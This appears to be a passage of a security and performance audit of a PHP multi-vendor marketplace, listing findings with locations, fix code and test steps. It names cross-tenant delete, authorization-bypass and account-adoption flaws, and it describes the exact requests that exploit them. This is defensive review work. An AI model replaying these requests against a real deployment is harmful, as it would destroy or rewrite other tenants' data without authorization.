**Regression Risk:** Medium — `vendors.party_type` must be populated and non-NULL for every existing row, or that vendor is silently locked out of their own panel **and mobile app**. Run first: `SELECT party_type, COUNT(*) FROM vendors WHERE deleted_at IS NULL GROUP BY party_type;` — only 'vendor' and 'manufacturer', no NULLs. Note the added `where` on a LEFT-joined `v.party_type` in `findStaffVendor` also (correctly) drops orphaned staff rows.
**Testing:** *Works:* vendor owner and branch manager reach `/vendor/*` and `GET /api/v1/vendor/dashboard`; manufacturer reaches `/manufacturer/dashboard`; a vendor on monline still sees prices and can place a PO. *Closed:* as a manufacturer owner, `/vendor/dashboard`, `/vendor/products/new`, `/vendor/pos`, `/vendor/staff` all redirect with "This login is not linked to a vendor account."; `GET /api/v1/vendor/dashboard` with a manufacturer JWT returns `notVendor`. Add the mirror case to `ManufacturerPanelIsolationTest`.

---

#### M12 — Cross-tenant destructive write: price-list and price-tier deletes are keyed on the row id alone
**Severity:** Medium
**Location:** `app/Models/PricingRepository.php:140` (`deleteSpecial`), `:149` (`deleteTier`); callers `Vendor\ProductPricingController.php:62`, `:73`; same shape at `Api\V1\VendorApiController.php:1716`.
**Description:** `deleteSpecial(int $productId, int $listId)` verifies `$productId` belongs to the vendor — then passes `$listId` straight to a repository that deletes by primary key with no tenant, product or variant predicate. The two ids are independent path segments. A vendor supplies their **own** product id to satisfy the check and any other vendor's price-list or price-tier id as the second segment. `deleteSpecial()` soft-deletes the `price_lists` row plus all items and flips status to 'expired'; `deleteTier()` performs a **hard DELETE** with no soft-delete to recover from. Both ids are small sequential integers. The ADD path in the same controller is careful (it verifies the variant belongs to both the product and the vendor) — only the delete path drops it.
**Fix:** Scope at the repository, where a caller cannot forget. `deleteTier($tierId, $vendorId)` joins `price_tiers`→`product_variants` and returns false unless `pv.vendor_id` matches; `deleteSpecial($listId, $vendorId)` refuses if any item on the list points at a variant that is not this vendor's. Pass the vendor id from `Vendor\ProductPricingController` and `$product['vendor_id']` from the admin controller (which resolves the product first, so admin behaviour is unchanged). Separately add the missing ownership check to `VendorApiController::deleteProductPricing`.
**Regression Risk:** Low — verify against the live schema that `price_list_items` and `price_tiers` both carry `variant_id` (the read paths indicate they do), and that no price list is intentionally shared across vendors (a platform-wide campaign list would start refusing). A refused delete currently still flashes 'Removed.' — switch the flash to reflect the boolean return.
**Testing:** *Works:* add and delete a special price and a tier on your own product, via vendor and admin; the effective-price preview recalculates as before. *Closed:* as vendor A, POST `/vendor/products/{A's product}/pricing/tier-delete/{B's tier id}` and `…/special-delete/{B's list id}` — both rows must survive with `deleted_at IS NULL` and `status='active'`. Same via the API route → 404, no change.

---

#### M13 — Vendor stock-transfer lifecycle actions have no shop scope and no permission check
**Severity:** Medium
**Location:** `app/Controllers/Vendor/TransferController.php:87-131` (all seven actions via `act()`); `app/Libraries/Inventory/TransferService.php:48-90`.
**Description:** The same controller demonstrates the rule and then drops it. `index()` filters the list so a non-owner sees only transfers touching their assigned shops; `create()` refuses a destination outside `allowedShopIds()` and routes a non-owner into the change-request queue. But `approve/reject/pack/dispatch/receive/close/cancel` all funnel through `act()`, which calls `requireVendor()` and nothing else — no `requireShopAccess()`, no `isOwner()`, no `can()`. `TransferService::find($id, $vendorId)` scopes to the vendor only. So any active staff row — a cashier, a packer — can approve, dispatch, receive or cancel a transfer between shops they do not work at, by POSTing a small sequential id. `dispatch()` physically decrements source stock; `receive()` takes an attacker-supplied `qty_received`. It also defeats the governance the same controller enforces on `create()`: a staffer cannot request a transfer but can execute one sitting in the queue.
**Fix:** Add `requireTransferAccess(int $id)` that loads the transfer, short-circuits `true` for the owner, and otherwise requires `from_shop_id` **or** `to_shop_id` to be in `allowedShopIds()` — mirroring the filter `index()` already applies. Route every action through `act($id, fn () => …)`.
**Regression Risk:** Low — owners see no change. Branch managers keep every transfer touching their own shop, which is exactly the set `index()` shows them, so no UI button becomes dead. The one behavioural change: a staffer acting on a transfer between two shops they are not assigned to now gets "Transfer not found." If a site relies on a central packer processing all branches from one login, assign that user to the relevant shops rather than weakening the check.
**Testing:** *Works:* owner drives a full lifecycle and stock moves; the destination branch manager can still receive/close; the source branch manager can still approve/pack/dispatch. *Closed:* as a cashier assigned only to shop 3, POST every action against a shops-1↔2 transfer — all redirect with "Transfer not found.", `stock_transfers.status` and both shops' `inventory_levels` unchanged.

---

#### M14 — Any vendor staff member can create a delivery-rider login account
**Severity:** Medium
**Location:** `app/Controllers/Vendor/StaffController.php:150-173` (`addRider`); route `app/Config/Routes.php:757`.
**Description:** Every other write on the staff page goes through `guardStaffAccess()` (owner, `vendor_staff.manage`, or `staff.request` downgraded to a change request). `addRider()` alone calls bare `requireVendor()` and then creates the account outright — a `users` row plus a `delivery_boys` row, with the rider's name, phone, email **and password** taken directly from request input. The attacker controls the credentials, so this is a staffer minting a working platform login and knowing its password, bound to the vendor's fleet and assignable to real deliveries — with access to customer addresses, delivery OTPs and COD cash through the rider panel and rider API. A `rider.manage` permission exists, is granted to `vendor_owner` and `vendor_shop_manager` and to no other staff role, and is never checked here.
**Fix:**
```php
// Creating a rider mints a login with an attacker-chosen password and binds it to the
// vendor's fleet — the same class of action as create()/update(), so it takes the same
// gate. 'rider.manage' is seeded (vendor scope) and held by vendor_owner and
// vendor_shop_manager; other staff roles must not reach here.
if (! $this->isOwner() && ! $this->can('rider.manage') && ! $this->can('vendor_staff.manage')) {
    return redirect()->to('vendor/staff')->with('error', "You don't have permission to manage staff.");
}
```
Also add `canAddRider` to the view data so the form is hidden — but keep the server check; the POST is the boundary.
**Regression Risk:** Low — owners and branch managers unaffected. Cashiers, packers and helpers lose it, which is what the class docblock always intended. Check creation history for `delivery_boys` rows created by other roles before shipping.
**Testing:** *Works:* owner and branch manager both still add a rider who can sign in at `/rider/login`. *Closed:* as `vendor_pos_cashier` and `vendor_packer`, POST `/vendor/staff/riders` with a valid CSRF token — both redirect with the permission error, `SELECT COUNT(*) FROM delivery_boys WHERE phone='<test>'` stays 0, no new `users` row.

---

#### M15 — Vendor API staff endpoints adopt an arbitrary existing user by phone, then rewrite that user's name
**Severity:** Medium
**Location:** `app/Controllers/Api/V1/VendorApiController.php:1490` (`createStaff`), `:1540` (`updateStaff`); schema `database/sql/10_staff.sql:56-73`.
**Description:** `createStaff()` upserts by phone: if a `users` row exists it **reuses that user id** with no check on `principal_type`, `status`, or existing tenancy — then inserts an active `vendor_staff` row binding that person to the caller's vendor. A vendor owner who knows a platform admin's, rider's or rival's phone number creates an active staff relationship without the victim's involvement. `updateStaff($userId)` then verifies only that a `vendor_staff` row exists for `(user_id, vendor_id)` — which the attacker just created — and runs `UPDATE users SET name = ?`: an arbitrary cross-tenant write to the global `users` table. And `findStaffVendor()` resolves any active `vendor_staff` row, so a victim with no vendor of their own now resolves into the attacker's tenant.

Separately, all three methods write `staff_shop_assignments` using columns `staff_user_id` and `vendor_id` that **do not exist** on that table (it is keyed on `vendor_staff_id`, `shop_id`). So the shop-assignment half has never worked; it raises a DB error *after* the `users` and `vendor_staff` writes have committed (no transaction), leaving the binding in place. That also likely means these endpoints are unused by the shipped app — confirm from access logs.
**Fix:** Refuse to adopt an existing account, constrain shop ids to the caller's own shops, and delegate to `VendorStaffRepository`, which the web panel already uses and which gets both right:
```php
// Never adopt an existing account by phone: that would bind an admin, a rider or
// another vendor's staffer to this tenant without their involvement, and updateStaff()
// would then treat them as ours to rewrite.
if ($db->table('users')->where('phone', $phone)->where('deleted_at', null)->countAllResults() > 0) {
    return $this->fail('That phone number already belongs to an account.', 409);
}
$shopIds = array_values(array_intersect(
    array_map('intval', (array) ($body['shop_ids'] ?? [])),
    service('vendorAccountRepository')->shopIdsForVendor($vid)));
if ($shopIds === []) { return $this->fail('Assign the staff member to at least one of your shops.', 422); }
return service('vendorStaffRepository')->createStaff($vid, [...], $this->userId());
```
**Regression Risk:** Medium — the repository keys staff by `vendor_staff.id`, not `users.id`, so `PUT/DELETE /api/v1/vendor/staff/{id}` changes meaning. **Take the translation option** (`SELECT id FROM vendor_staff WHERE user_id = ? AND vendor_id = ?` before delegating) to preserve the wire contract for a live mobile client, unless the app team confirms nothing calls these.
**Testing:** *Works:* `POST /api/v1/vendor/staff` with a fresh phone and one of your own shop ids → 200, new `users`, new `vendor_staff`, **and a real `staff_shop_assignments` row keyed on `vendor_staff_id`** (new; it never worked). The staffer can sign in and appears correctly on the web panel. *Closed:* POST with a platform admin's phone → 409, no `vendor_staff` row; a shop id belonging to vendor B → 422, nothing written; `SELECT name FROM users WHERE id={adminId}` unchanged after attempting the PUT.

---

#### M16 — The impersonation exit route sits inside the group the principal pin blocks
**Severity:** Medium *(downgraded from High)*
**Location:** `app/Config/Routes.php:179` (`admin/portal/leave` inside the `webAuth:platform` group opened at `:171`); `Admin\PortalController::startStaffImpersonation()` (`:214-235`).
**Description:** Impersonation deliberately rewrites `principal_type` to 'vendor'/'manufacturer' so the target panel resolves the right scope. The exit route lives inside the group pinned to `platform`. While the pin is log-only this is invisible; the moment `auth.enforcePrincipalType=true` — the documented end state and the mitigation for H4 — `checkPrincipal()` sees actual='vendor' vs expected='platform' and redirects to `vendor/dashboard`. `leave()` is never entered. `grep` confirms `portal/leave` appears in exactly two places (the route and the banner partial), so there is no alternate exit.
**Why Medium, not High:** it is not exploitable today (requires the flag on, which H4 shows is off), and it is **not a permanent trap** — `$routes->post('logout', …)` is at `Routes.php:35`, top level, outside every pinned group, so the admin can always log out and sign back in with their own credentials. The real cost is a broken "Return to admin" button plus an audit gap (`portal.stop_impersonation` never fires). But it is a genuine blocker for the H4 rollout, and an operator who flips the flag will discover it in production mid-impersonation.
**Fix:** Move the exit out of the pinned group, declared **before** the group (the file already relies on first-declaration-wins):
```php
// Exit impersonation. Deliberately OUTSIDE the `webAuth:platform` group: while an admin
// is in a portal their principal_type is 'vendor'/'manufacturer', so the pin would block
// the only way back. Plain `webAuth` still requires a live session; leave() itself
// refuses to do anything without a valid is_impersonating stash.
$routes->post('admin/portal/leave', 'Admin\\PortalController::leave', ['filter' => ['webAuth','csrf']]);
```
**Regression Risk:** Low — URL, method, CSRF and controller unchanged, so the existing banner button works with no view edit. The only semantic change: a logged-in non-impersonating user can POST to it, which returns a redirect to `admin/dashboard` and writes nothing (`leave()` already no-ops safely and fails safe on a corrupt stash).
**Testing:** *Works:* with the flag unset, admin → vendor portal → Return to admin → `/admin/dashboard`; repeat for manufacturer, shop, rider; `audit_logs` has both start and stop rows. *Closed:* set `auth.enforcePrincipalType=true` and repeat all four round trips — each must return to `/admin/dashboard`.

---

#### M17 — monline PO receive can be replayed to credit stock twice
**Severity:** Medium *(downgraded from High; the "swallowed failure" half is refuted)*
**Location:** `app/Models/PurchaseOrderRepository.php:512-557` (`receive`), same shape in `transition()` (`:467-500`).
**Description:** The status is read by `findFor()` at `:514` — a plain SELECT **outside** the transaction that begins at `:532` — checked at `:524`, then written at `:552`. Two concurrent POSTs (a double-tapped "Mark received", or a retry) both read 'dispatched', both pass, and both run the full `InventoryService::receive()` loop. Stock credited twice, two sets of `stock_batches` and `inventory_ledger` rows. The comment at `:520-523` explicitly reasons about idempotency and still gets it wrong, because the guard is not under a lock.
*The companion claim is refuted:* the "swallowed `InventoryService` failure marks the PO received" scenario does **not** occur. `BaseConnection::handleTransStatus()` sets `transStatus=false` whenever `transDepth !== 0`, `$transStrict` is `true` and never disabled, so the flag survives the inner rollback and the outer `transComplete()` performs a real rollback with `receive()` returning 'Could not record the receipt.' Only a non-query PHP `Throwable` inside `InventoryService::receive` could leave partial writes — narrow, and not any of the cited triggers.
**Why Medium:** the actor is the authenticated buyer vendor crediting stock into its own shop, and that vendor can already adjust its own inventory freely. No privilege gain, no cross-tenant reach; the realistic trigger is a double click.
**Fix:** Claim the transition under a row lock inside the transaction, and honour the service's return value:
```php
$db->transBegin();
try {
    // findFor() read the status OUTSIDE this transaction, so two concurrent 'mark
    // received' calls would otherwise both pass the guard above and credit stock twice.
    $locked = $db->query('SELECT status FROM mfg_purchase_orders WHERE id = ? AND deleted_at IS NULL FOR UPDATE',
        [$poId])->getRowArray();
    if ($locked === null || (string) $locked['status'] !== 'dispatched') {
        $db->transRollback();
        return ['ok' => false, 'error' => 'Only a dispatched order can be received.'];
    }
    foreach ($found['items'] as $item) {
        …
        $ok = $service->receive(…);
        if (! $ok) { throw new \RuntimeException('stock credit failed for variant ' . (int) $item['variant_id']); }
```
The existing `catch (Throwable $e)` already rolls back, logs and returns the right error. Apply the same claim in `transition()`.
**Regression Risk:** Low — happy path unchanged. The `FOR UPDATE` briefly locks one PO row; contention is negligible at PO volume.
**Testing:** *Works:* dispatch → receive → stock rises, one ledger row per line, `qty_received` set, status 'received'. *Closed:* two parallel `POST /monline/orders/{id}/receive` — one ok, one "Only a dispatched order can be received."; `SELECT SUM(qty_delta) FROM inventory_ledger WHERE ref_type='mfg_purchase_order' AND ref_id=?` equals the PO qty exactly once.

---

#### M18 — `InventoryService::reserve()` and `consumeBatches()` are read-check-write with no row locks; batch qty can go negative
**Severity:** Medium
**Location:** `app/Libraries/Inventory/InventoryService.php:104-117` (`reserve`), `:353-365` (`consumeBatches`).
**Description:** `reserve()` reads `available` via `levels()` — an unlocked SELECT under REPEATABLE READ — compares, then increments `reserved`. Two concurrent reservations both pass, so `reserved` exceeds `on_hand` and the generated `available` column goes negative. Caller: `TransferService::approve()`, so two staff approving transfers of the same stock both get a green light. `consumeBatches()` SELECTs the open cost layers unlocked, then decrements each with `set('qty', 'qty - ' . $take, false)` — **with no `GREATEST(…, 0)` floor**, unlike `bump()` at `:371`. Two concurrent sales read the same layers and both take from the same batch, driving `stock_batches.qty` negative, which then corrupts FIFO valuation permanently because nothing repairs a negative layer.
**Fix:** `SELECT available … FOR UPDATE` before the check in `reserve()`; a raw `SELECT id, qty … ORDER BY COALESCE(mfg_date, created_at) ASC, id ASC FOR UPDATE` for the layer list; and floor the decrement with `GREATEST(qty - $take, 0)` to match `bump()`.
**Regression Risk:** Medium — `consumeBatches()` is called from `adjust()`, `transferOut()` and `sell()` (the POS sale path). Two terminals selling the same variant now serialise; a long POS transaction could hit `innodb_lock_wait_timeout`, surfacing as the existing `catch → return false` and a failed sale. **Measure POS transaction duration first.** Deadlock risk is low (deterministic lock order per pair), but multi-line sales lock pairs in cart order — sort by `variant_id` in `PosSaleRepository` if deadlocks appear. The `GREATEST` floor changes arithmetic only where it is currently producing a negative.
**Testing:** *Works:* normal POS sale, stock adjustment, full transfer lifecycle and PO receipt — `inventory.on_hand`, `stock_batches.qty` and ledger rows all match pre-change values. *Closed:* single batch of qty 3, two parallel sales of 3 → qty 0, never negative. `available=1`, two parallel transfer approvals → exactly one succeeds. Watch `SHOW ENGINE INNODB STATUS` during a parallel POS soak.

---

#### M19 — Storefront order placement bypasses `InventoryService` — no `inventory_ledger` movement is ever posted for an online sale
**Severity:** Medium
**Location:** `app/Models/StoreOrderRepository.php:162-166`.
**Description:** `InventoryService`'s own header states "Every quantity change is atomic and posts an inventory_ledger movement (with running balance_after), so stock is always auditable." The **primary sales channel** does not use it: `place()` issues a raw `UPDATE inventory SET on_hand = GREATEST(on_hand - qty, 0)` and posts nothing. Every other movement — POS sales, transfers, adjustments, PO receipts, returns — writes a ledger row. So `inventory_ledger.balance_after` diverges from `inventory.on_hand` the first time a web order is placed and never reconverges; any reconciliation or stock-history screen built on the ledger is wrong for every shop that sells online; `movement_type='sale'` exists in the ENUM and is never written; and "where did my stock go" cannot be answered for online orders.
**Fix:** Post the ledger row alongside the existing decrement, keeping the decrement expression byte-identical. **Deliberately do not** switch to `InventoryService::sell()` — that would also consume `stock_batches` cost layers and change FIFO valuation for every existing vendor.
```php
// Post the movement InventoryService would have posted. Written here rather than
// delegating to sell(), because that also consumes stock_batches cost layers and
// would change FIFO valuation for every existing vendor.
$bal = (float) ($db->table('inventory')->select('on_hand')
    ->where('shop_id',$shopId)->where('variant_id',$vid)->get()->getRowArray()['on_hand'] ?? 0);
$db->table('inventory_ledger')->insert([
    'uuid' => bin2hex(random_bytes(18)), 'variant_id' => $vid, 'shop_id' => $shopId,
    'movement_type' => 'sale', 'qty_delta' => -(float) $it['qty'], 'balance_after' => $bal,
    'ref_type' => 'order', 'ref_id' => $subOrderId, 'reason_code' => 'sale', 'origin' => 'server',
]);
```
**Regression Risk:** Low — purely additive, inside the existing transaction. One extra SELECT+INSERT per line. **Historical gaps are not repaired** — a reconciliation report will now show a discontinuity at the deploy date rather than an ever-widening one. Confirm no report treats `inventory_ledger` row counts as a POS-only sales proxy.
**Testing:** *Works:* place web and app orders — `on_hand` decrements identically, all other rows unchanged, `GREATEST` flooring still applies. *Closed:* `SELECT * FROM inventory_ledger WHERE ref_type='order' AND ref_id=<sub_order_id>` returns one row per line with `movement_type='sale'`, negative `qty_delta` and `balance_after` matching post-update `on_hand`. Force a mid-placement failure and confirm no orphan ledger row.

---

#### M20 — Admin product list and CSV export load the entire product table into PHP memory
**Severity:** Medium *(downgraded from High — privileged operator footgun, not attacker-driven)*
**Location:** `app/Models/AdminProductRepository.php:65-80`; `app/Controllers/Admin/ProductController.php:39-48`, `:72-92`.
**Description:** `list()` omits LIMIT entirely when `limit <= 0` and returns `getResultArray()`. `?per_page=all` (a live dropdown option) maps to `limit 0`, and the view renders every row; `export()` hard-codes `limit 0` and then double-buffers via `stream_get_contents()` + `setBody()`. At the catalogue scale the storefront code documents, either is a guaranteed OOM or multi-minute request pinning an FPM worker and a DB connection. Separately, the default list has no status filter, so `ORDER BY p.created_at DESC` filesorts (the only supporting index leads with `status`). Both entry points are behind `webAuth:platform` **and** an explicit `guard('product.view')`, so there is no unauthenticated or low-privilege path — hence Medium.
**Fix:** `private const MAX_ROWS = 5000;` and `$b->limit($limit > 0 ? min($limit, self::MAX_ROWS) : self::MAX_ROWS, …)` — mirroring `ReportRepository::exportRows()`, which already caps at 5000. Add `unset($rows);` before the response buffers the CSV. Add `ALTER TABLE products ADD INDEX IF NOT EXISTS idx_products_del_created (deleted_at, created_at);` in a numbered migration.
**Regression Risk:** Medium — a genuine behaviour change: `?per_page=all` and the export now return at most 5000 rows. **If an operator relies on the export for a full catalogue dump they will silently get a truncated file** — add a visible "truncated" line to the CSV, or paginate the export. Choose the ceiling against `SELECT COUNT(*) FROM products WHERE deleted_at IS NULL` first; if the catalogue is a few thousand rows, 5000 changes nothing today and only prevents the cliff.
**Testing:** *Works:* 25/50/100/200/500 per page render identically; all filters unchanged; a filtered export under the ceiling is byte-identical. *Closed:* `?per_page=all` with no filters returns within a second (check `memory_get_peak_usage()`); `EXPLAIN` the default list query — no `Using filesort`.

---

#### M21 — `sub_orders` and `orders` have no index leading with `created_at`/`deleted_at`
**Severity:** Medium
**Location:** `app/Models/DashboardRepository.php:41-47`; `app/Models/ReportRepository.php:59-62`, `:71-76`. Schema `database/sql/04_transaction.sql:158-163`, `:119-124`; `database/sql/perf1_indexes.php:20-22`.
**Description:** `sub_orders` is the fastest-growing table in the schema (one row per product per order, by design). Every index on it leads with `vendor_id`, `order_id` or `shop_id`. So `WHERE so.deleted_at IS NULL ORDER BY so.created_at DESC LIMIT 8` — the admin dashboard's recent-orders panel — full-scans and filesorts the whole table **on every dashboard load, to return 8 rows**. `gstSummary($start,$end)` and `exportRows()` full-scan regardless of how narrow the date window is. `orders` is the same. At 5M sub-orders, two admins refreshing the dashboard is enough to evict the InnoDB buffer pool and slow the storefront's own queries.
**Fix:** A new numbered, idempotent migration in the project's existing style (`database/sql/74_report_indexes.sql`), added to `run_all.sql`:
```sql
ALTER TABLE `sub_orders` ADD INDEX IF NOT EXISTS `idx_suborders_del_created` (`deleted_at`,`created_at`);
ALTER TABLE `orders`     ADD INDEX IF NOT EXISTS `idx_orders_del_created`    (`deleted_at`,`created_at`);
```
No PHP change — the existing queries pick these up automatically.
**Regression Risk:** Low — two extra index maintenance operations per sub-order insert on the order-placement hot path, plus disk. On a large existing table the ALTER takes time; MariaDB 10.11 adds secondary indexes online, but run it in a quiet window. No query results change.
**Testing:** *Works:* dashboard shows the same 8 orders; `/admin/reports` shows the same GST numbers and the CSV is identical. *Closed:* `EXPLAIN` the dashboard query — uses `idx_suborders_del_created`, no `Using filesort`; `EXPLAIN` gstSummary — `type=range` with a small rows estimate. Time both pages with `long_query_time=0.1`.

---

#### M22 — Order placement and cart validation issue 3-4 queries per cart line over an unbounded client item list
**Severity:** Medium
**Location:** `app/Controllers/Api/V1/CustomerApiController.php:235-253` (`placeOrder`), `:485` (`validateCart`), `:919-927` (`qtyError`), `:173-181` (input).
**Description:** Per line: `purchaseRulesForVariant()`, then `qtyError()` which calls **the same method again** plus `variantStock()`, then `variantDeliverability()` (a 3-table join fetching up to 200 shop rows). `StoreOrderRepository::place()` then runs `purchaseRulesForVariant()` a *third* time per line. The item list is entirely client-supplied and unbounded — `foreach ((array) ($in['items'] ?? []) as $line)`. A client posting 2,000 valid variant ids produces one enormous `IN (…)` plus ~12,000 queries in one authenticated request; any customer JWT suffices. Even a legitimate 30-item grocery cart costs ~120 round-trips per validate call, which the app polls as the user edits.
**Fix:** `private const MAX_CART_LINES = 100;` with a `break` once the map reaches it, and a per-request memo `rulesFor(int $variantId)` used in place of both `purchaseRulesForVariant()` calls — removing one query per line with zero behaviour change (rules cannot change mid-request).
**Regression Risk:** Low — memoisation is behaviour-neutral. The cap silently drops overflow lines; check `SELECT MAX(c) FROM (SELECT order_id, COUNT(*) c FROM order_items GROUP BY order_id) t` first, and prefer an explicit `VALIDATION_ERROR` ("Too many items in one order") over truncation if any real order approaches it.
**Testing:** *Works:* 1-, 5- and 30-item carts place and validate with identical JSON. *Closed:* with the query log on, a 10-line validate shows 10 `SELECT p.min_purchase_qty` occurrences, not 20. Post 500 items → fast and bounded.

---

#### M23 — Order tracking runs three queries per sub-order, behind a polled mobile endpoint
**Severity:** Medium
**Location:** `app/Models/StoreOrderRepository.php:239-266`.
**Description:** One query fetches the sub-orders, then the loop issues three per sub-order: delivery/rider join, order items, and an invoice-id lookup. Since `place()` creates one sub-order per product, a 20-item order is 1 + 60 queries — and this backs `GET /api/v1/customer/track/{orderNo}`, the shipped app's live tracking screen, **polled while an order is in flight**. A hundred customers tracking simultaneously is ~610 queries/second from one screen.
**Fix:** Batch the two cheap lookups with `whereIn` over `$subIds` (items keyed into `$itemsBySub`, invoice ids into `$invoiceBySub`), keeping the per-sub delivery query, which needs `ORDER BY d.id DESC LIMIT 1` semantics per sub-order and is genuinely awkward to batch. Strip `sub_order_id` from each item row before storing so the payload keys are unchanged.
**Regression Risk:** Low — the batched item query adds an explicit `ORDER BY id`, matching the natural PK order the app already sees. If a sub-order ever had multiple invoices the original took an arbitrary one and the map takes the last — check `SELECT sub_order_id, COUNT(*) FROM invoices GROUP BY 1 HAVING COUNT(*)>1`. Needs indexes on `order_items(sub_order_id)` and `invoices(sub_order_id)`.
**Testing:** *Works:* diff the tracking JSON byte for byte for a single- and multi-item order, including `delivery_otp` masking, ETA clamping, item order and `invoice_id`. *Closed:* item and invoice queries are 1 each, not 10 each.

---

#### M24 — monline browse: unbounded page offset, correlated distance subquery in ORDER BY, four uncached aggregations per render
**Severity:** Medium
**Location:** `app/Models/MonlineCatalogRepository.php:47-57`, `:112-126`; `app/Controllers/Monline/CatalogController.php:41-68`.
**Description:** Three compounding problems on a **public** page. (1) `$page` has no ceiling, so `?page=1000000` becomes `LIMIT 48 OFFSET 47999952` and MySQL generates and discards every row. (2) With a buyer location, `distance_km` is a correlated `MIN(6371 * ACOS(…))` subquery over `product_mshops`→`mshops`, used as the first two sort keys — so it must be evaluated for **every** candidate row before sorting, and `LIMIT 48` provides no protection. (3) `browse()` runs `products()`, `countProducts()`, `manufacturers()` (a `COUNT(DISTINCT p.id)` GROUP BY) and `categories()` (another) with **no caching at all** — four full-catalogue passes per page view.
**Fix:** Clamp the page against the count that is already computed (`$pages = max(1, (int) ceil($total / $limit)); $page = min($page, $pages);`) **before** it becomes an OFFSET; wrap `manufacturers()` and `categories()` in 300s `cache()` under keys `monline_manufacturers` / `monline_categories`; add `ALTER TABLE mshops ADD INDEX IF NOT EXISTS idx_mshops_status_del (status, deleted_at);`.
**Regression Risk:** Low — `?page=99999` now shows the last page instead of an empty grid (strictly better UX; clamp to `$pages + 1` if an empty page is preferred). The 300s caches make the manufacturer/category filter counts up to five minutes stale — confirm nobody treats them as authoritative. Check `monline/browse.php` does not read `filters['offset']` for anything but pagination links.
**Testing:** *Works:* browse with and without a signed-in buyer, with a location set and cleared, with `?q=`/`?category=`/`?manufacturer=` — same products, same order, prices still gated on `isBuyer()`; paginate normally through pages 1..N. *Closed:* `?page=1000000` returns immediately and shows the last page; with the query log on, 10 renders produce at most two `COUNT(DISTINCT p.id)` GROUP BYs in 300s, not 20.

---

#### M25 — The storefront home page resolves the nearby-shop set eight times per request with identical parameters
**Severity:** Medium
**Location:** `app/Controllers/Store/StoreController.php:56-66` (`scoped`), called from `:21`, `:25`, `:31`, `:43`; `app/Models/StoreShopRepository.php:33-36`.
**Description:** `scoped()` calls `nearbyShopIds($lat,$lng)` every time it is invoked, and `home()` invokes it for the category facets, the deals rail, each of up to 5 category rails, and the main product grid — plus a separate `nearby()` call for the shops strip. Up to 8 executions of the same query with the same arguments in one request. Each runs a `shops`→`vendors`→`business_types` join with a ±0.5° bounding box and **no SQL LIMIT** — the limit is applied in PHP after a Haversine loop over every returned row. In a dense metro that is every shop within ~55km, hydrated into PHP, sorted and sliced, eight times. The result cannot change within a request (the location comes from the session), so seven are pure waste on the busiest page of the site.
**Fix:** Memoise in `StoreShopRepository`, keyed on rounded coordinates plus limit so it cannot be wrong for a different point:
```php
/** @var array<string,list<int>> per-request memo: "lat,lng,limit" => shop ids */
private array $nearbyIdMemo = [];

public function nearbyShopIds(?float $lat, ?float $lng, int $limit = 200): array
{
    if ($lat === null || $lng === null) { return []; }
    // StoreController::home() scopes eight separate catalog reads from the same session
    // location; without this the bounding-box query + Haversine loop runs eight times.
    $key = sprintf('%.6f,%.6f,%d', $lat, $lng, $limit);
    return $this->nearbyIdMemo[$key]
        ??= array_map(static fn ($s) => (int) $s['id'], $this->nearby($lat, $lng, $limit));
}
```
Also bound the SQL as a safety valve: `->limit(max($limit * 5, 500))` in `nearby()`. Verify `storeShopRepository` is registered shared in `Config\Services` (the CI4 default for `service()`), or the memo does nothing.
**Regression Risk:** Low — the memo is per-request and exactly keyed, so it cannot return a stale or wrong set. The SQL cap is the only behavioural risk: if a location genuinely has more than `max($limit*5, 500)` shops in the box, the excess is dropped in arbitrary order (rows come back unordered). Check `SELECT COUNT(*) FROM shops WHERE status='active' AND deleted_at IS NULL` and the densest-city count first; if well under 500, the cap is inert and purely defensive.
**Testing:** *Works:* set a location on `/store` — home rails, category grid, shops strip and product grid contain exactly the same items; repeat with no location; same for `/api/v1/customer/home?lat=…&lng=…`. *Closed:* with the query log on, one `/store` load with a location shows 2 `FROM shops s LEFT JOIN vendors` occurrences (the memoised id lookup plus the separate strip call), not 8+.

---

#### M26 — Inventory snapshot builds a variants × shops query matrix — two queries per cell
**Severity:** Medium
**Location:** `app/Libraries/Inventory/InventoryService.php:313-335` (`snapshotRows`), inner query at `:269-273`.
**Description:** A loop over shops nested inside a loop over variants calls `levels()` and `valuation()` per pair: `2 × |variants| × |shops|` queries. 40 variants × 15 shops = 1,200 queries in one page render, degrading **multiplicatively**. The `valuation()` half is the expensive one — it sorts every open cost layer by `COALESCE(mfg_date, created_at) ASC, id ASC`, an expression no index on `stock_batches` can serve.
**Fix:** Fetch both datasets once with `whereIn` over the full variant and shop sets, index them into `$levelsByPair` / `$layersByPair`, and pair in PHP. Keep the identical `ORDER BY` on the batched batch query so FIFO layer order is preserved (PHP appends in result order per pair), and keep `StockValuation` doing the arithmetic so the numbers cannot move. Reproduce `levels()`'s empty-row default as a `$zero` array.
**Regression Risk:** Low — FIFO ordering preserved by construction. The new early `return []` when there are no shops is a shape change: previously an empty `$shops` returned one row per variant with `levels => []` and zero totals; drop that half of the guard if any view depends on it. `levels()`/`valuation()` are untouched for their other callers.
**Testing:** *Works:* open a multi-variant product's inventory tab for a multi-shop vendor and diff **every** rendered number (on_hand, reserved, available, reorder level, on-hand value, qty, weighted-average cost) against the pre-change page. Include a variant with no inventory row at a shop and one with no batches. *Closed:* `FROM inventory` and `FROM stock_batches` each appear once, not |variants|×|shops| times. Run the `StockValuation` suite.

---

#### M27 — Delivery status transition rules are implemented twice and have drifted in five places
**Severity:** Medium
**Location:** `app/Models/DeliveryRepository.php:53-62` (`const FLOW`) vs `app/Libraries/Workflow/StatusMachine.php:50-57` (`const DELIVERY`).
**Description:** `StatusMachine` exists to own transitions and `RiderRepository::updateStatus()` uses it. `DeliveryRepository::updateStatus()`, which serves the admin panel, carries a private copy that disagrees:

| Transition | `DeliveryRepository::FLOW` | `StatusMachine::DELIVERY` |
|---|---|---|
| pending → out_for_delivery | allowed | forbidden |
| assigned → arrived | allowed | forbidden |
| failed → assigned | forbidden | allowed *(the retry path)* |
| picked_up → returned | forbidden | allowed |
| arrived → returned | forbidden | allowed |

So the answer to "can this delivery move to that state?" depends on which door the request came through. Both write the same column and both then run a near-identical `syncOrderFromDelivery()` onto the customer-visible timeline. `StatusMachine::DELIVERY` also includes a `'reassigned'` state that is a value of `delivery_assignments.status`, not `deliveries.status` — it describes a state the table cannot hold. Not a privilege issue; a correctness and support-cost issue (operations gets "that status change is not allowed" for a move the rider app performs happily).
